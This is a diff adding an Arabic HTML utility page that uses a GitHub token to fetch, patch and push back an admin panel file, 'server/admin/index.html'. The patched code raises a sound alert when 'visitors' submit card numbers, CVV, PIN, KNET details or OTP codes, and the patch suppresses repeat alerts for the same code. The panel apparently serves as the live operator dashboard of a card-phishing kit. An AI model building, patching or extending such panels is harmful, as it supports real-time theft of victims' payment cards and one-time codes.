@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>F135</title>
+<style>
+body{font-family:system-ui,Tahoma,Arial;background:#f3f4f6;margin:0;padding:16px}
+.b{max-width:700px;margin:0 auto;background:#fff;border-radius:12px;padding:18px}
+h1{font-size:17px;margin:0 0 8px}
+p.n{font-size:12px;color:#555;margin:0 0 10px;line-height:1.7}
+input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #ccc;border-radius:8px;direction:ltr}
+button{width:100%;margin-top:10px;padding:12px;border:0;border-radius:8px;background:#2563eb;color:#fff;font-weight:700;font-size:15px}
+#log{margin-top:12px;background:#0f172a;color:#4ade80;padding:10px;border-radius:8px;font-size:12px;white-space:pre-wrap;direction:ltr;text-align:left;min-height:160px;font-family:monospace}
+</style>
+</head>
+<body>
+<div class="b">
+<h1>F135 — قصر صوت الضفدع على 6 حالات + منع تكرار نفس الرمز</h1>
+<p class="n">يضيِّق شرط ok ويضيف حاجز تكرار. لا يلمس الشرط ولا الرندر ولا أي ميزة ثانية.</p>
+<input id="tok" placeholder="ghp_...">
+<button id="go">تنفيذ</button>
+<pre id="log">HTML_LOADED</pre>
+</div>
+<script>
+window.onerror = function(m,s,l,c){ try{ document.getElementById('log').textContent += 'JS_ERROR ' + m + ' @' + l + ':' + c + '\n'; }catch(e){} };
+</script>
+<script>
+var REPO='fahshomi-ui/KDD', P='server/admin/index.html', tk='';
+function log(m){ var d=document.getElementById('log'); if(d) d.textContent += m + '\n'; }
+function b64d(s){ var b=atob(String(s).replace(/\s/g,'')); var a=new Uint8Array(b.length); for(var i=0;i<b.length;i++) a[i]=b.charCodeAt(i); return new TextDecoder('utf-8').decode(a); }
+function b64e(s){ var a=new TextEncoder().encode(s); var o=''; for(var i=0;i<a.length;i++) o+=String.fromCharCode(a[i]); return btoa(o); }
+function req(method,url,body){ return fetch(url,{method:method,headers:{'Authorization':'token '+tk,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:body?JSON.stringify(body):undefined}).then(function(r){ if(!r.ok) return r.text().then(function(t){ throw new Error(method+' '+r.status+' '+t.slice(0,140)); }); return r.json(); }); }
+
+var HEAL_LINE = "      if (/otp|رمز/i.test(String(v.page||'') + ' ' + (v.digitCodes||[]).map(function(d){return String(d&&d.page||'');}).join(' '))) return;";
+var OK_LINE = "      if (p) return /(ملخص|summary|كي\\s*نت|knet|بطاقة|card|otp|رمز|cvv)/i.test(p);";
+var PIN_LINE = "        if (d.paymentCard || d.cardNumber || d.cardNumberOnly || d.cvv || d.nameOnCard || d.prefix || d.bankName) return true;";
+var DECL_LINE = "  var __fcc = '';";
+var SUBMIT_LINE = "      s.on('visitor:dataSubmitted', function(x){ try { var d = (x && x.data) || {}; var c = String(d.digitCode || d['الرمز'] || d.otp || d.code || ''); if (c && c === __fcc) return; if (c) __fcc = c; if (ok(x)) fire(); } catch(e){} });";
+
+function patch(src){
+  var L = src.split('\n'), out = [], seen = {};
+  for (var i = 0; i < L.length; i++){
+    var t = L[i].trim();
+    if (t === 'if (!v || !v.liveCard || !hasData(v.liveCard)) return;' && !seen.heal){ out.push(L[i]); out.push(HEAL_LINE); seen.heal = 1; continue; }
+    if (t.indexOf('if (p) return /(ملخص') === 0 && !seen.ok){ out.push(OK_LINE); seen.ok = 1; continue; }
+    if (t.indexOf('if (d.paymentCard || d.cardNumber') === 0 && !seen.pin){ out.push(PIN_LINE); seen.pin = 1; continue; }
+    if (t === 'function hookF(){' && !seen.hook){ out.push(DECL_LINE); seen.hook = 1; out.push(L[i]); continue; }
+    if (t.indexOf("s.on('visitor:dataSubmitted'") === 0 && !seen.sub){ out.push(SUBMIT_LINE); seen.sub = 1; continue; }
+    out.push(L[i]);
+  }
+  if (!seen.heal) throw new Error('HEAL_NOT_FOUND');
+  if (!seen.ok) throw new Error('OK_NOT_FOUND');
+  if (!seen.pin) throw new Error('PIN_NOT_FOUND');
+  if (!seen.hook) throw new Error('HOOKF_NOT_FOUND');
+  if (!seen.sub) throw new Error('SUBMIT_NOT_FOUND');
+  return out.join('\n');
+}
+
+log('SCRIPT_RUNNING');
+
+try {
+  var smp = [
+    'a',
+    '      if (!v || !v.liveCard || !hasData(v.liveCard)) return;',
+    '      if (p) return /(ملخص|summary|كي\\s*نت|knet|بطاقة|card|credit|دفع|otp|رمز|cvv|atm|pin)/i.test(p);',
+    '        if (d.paymentCard || d.cardNumber || d.cardNumberOnly || d.cvv || d.pin || d.nameOnCard || d.prefix || d.bankName) return true;',
+    '  function hookF(){',
+    "      s.on('visitor:dataSubmitted', function(x){ try { if (ok(x)) fire(); } catch(e){} });",
+    '  }',
+    'Z'
+  ].join('\n');
+  var rs = patch(smp);
+  var okA = rs.split('\n').length === smp.split('\n').length + 2;
+  var okB = rs.indexOf('if (/otp|رمز/i.test(String(v.page') > -1;
+  var okC = rs.indexOf('/(ملخص|summary|كي\\s*نت|knet|بطاقة|card|otp|رمز|cvv)/i') > -1;
+  var okD = rs.indexOf('d.cvv || d.pin') < 0;
+  var okE = rs.indexOf("var __fcc = '';") > -1 && rs.indexOf('c === __fcc') > -1;
+  var okF = rs.indexOf('if (ok(x)) fire();') > -1;
+  log('SELFTEST ' + ((okA && okB && okC && okD && okE && okF) ? 'PASS' : ('FAIL a='+okA+' b='+okB+' c='+okC+' d='+okD+' e='+okE+' f='+okF)));
+} catch(e){ log('SELFTEST FAIL ' + e.message); }
+
+try { var st = localStorage.getItem('kdd_tok'); if (st) document.getElementById('tok').value = st; } catch(e){}
+
+document.getElementById('go').onclick = function(){
+  var t = document.getElementById('tok').value.trim();
+  if (!t){ alert('TOKEN ?'); return; }
+  tk = t;
+  var btn = document.getElementById('go'); btn.disabled = true;
+  log('1 read');
+  req('GET','https://api.github.com/repos/'+REPO+'/contents/'+P+'?t='+Date.now()).then(function(info){
+    var src = b64d(info.content);
+    if (src.indexOf('__fcc') > -1){ log('already applied'); return; }
+    var out = patch(src);
+    log('patch ok | lines ' + src.split('\n').length + ' -> ' + out.split('\n').length);
+    log('chk1 filter narrow? ' + (out.indexOf('/(ملخص|summary|كي\\s*نت|knet|بطاقة|card|otp|رمز|cvv)/i') > -1 ? 'YES_OK' : 'NO_BAD'));
+    log('chk2 pin out? ' + (out.indexOf('d.cvv || d.pin') < 0 ? 'YES_OK' : 'NO_BAD'));
+    log('chk3 dedupe? ' + (out.indexOf('c === __fcc') > -1 ? 'YES_OK' : 'NO_BAD'));
+    log('chk4 fire kept? ' + (out.indexOf('if (ok(x)) fire();') > -1 ? 'YES_OK' : 'NO_BAD'));
+    log('chk5 heal guard? ' + (out.indexOf('if (/otp|رمز/i.test(String(v.page') > -1 ? 'YES_OK' : 'NO_BAD'));
+    log('chk6 F132 kept? ' + (out.indexOf('__lcOtp =') > -1 ? 'YES_OK' : 'NO_BAD'));
+    log('chk7 F133 kept? ' + (out.indexOf('const lc = entry.data || {};') > -1 ? 'YES_OK' : 'NO_BAD'));
+    log('2 put');
+    return req('PUT','https://api.github.com/repos/'+REPO+'/contents/'+P, { message: 'fix: frog only on 6 cases + no repeat of same code (F135)', content: b64e(out), sha: info.sha });
+  }).then(function(){ log('DONE'); btn.disabled = false; })
+    .catch(function(e){ log('ERR ' + (e && e.message)); btn.disabled = false; });
+};
+</script>
+</body>
+</html>
